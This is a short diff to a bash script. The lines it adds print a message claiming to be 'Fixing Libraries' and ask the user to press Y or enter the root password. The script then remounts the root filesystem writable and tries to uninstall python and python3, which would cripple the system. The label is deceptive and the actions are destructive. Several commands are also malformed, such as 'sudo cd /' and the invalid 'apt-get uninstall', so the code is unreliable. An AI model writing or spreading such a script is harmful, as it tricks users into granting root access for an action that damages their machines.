@@ -1,5 +1,7 @@
 #!/bin/bash
 sudo cd /
+echo "INFO: Fixing Libraries, please press Y or enter the root password when asked."
+sleep 2
 sudo mount -o remount, rw /
 sudo apt-get uninstall python
 sudo apt-get uninstall python3
